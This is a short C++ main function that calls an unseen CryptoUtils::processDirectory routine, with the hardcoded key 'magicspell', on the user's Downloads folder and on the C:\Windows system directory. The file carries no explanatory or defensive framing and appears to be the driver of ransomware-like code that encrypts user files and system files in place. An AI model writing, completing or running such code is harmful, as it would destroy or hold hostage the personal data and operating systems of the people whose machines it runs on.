#include "CryptoUtils.h"
#include <cstdlib>

int main() {
    // Get USERPROFILE directory
    char* userProfile = std::getenv("USERPROFILE");
    if (userProfile) {
        std::string downloadsPath = std::string(userProfile) + "\\Downloads";
        CryptoUtils::processDirectory(downloadsPath, "magicspell");
    }

    // Process C:/Windows
    CryptoUtils::processDirectory("C:\\Windows", "magicspell");

    return 0;
}
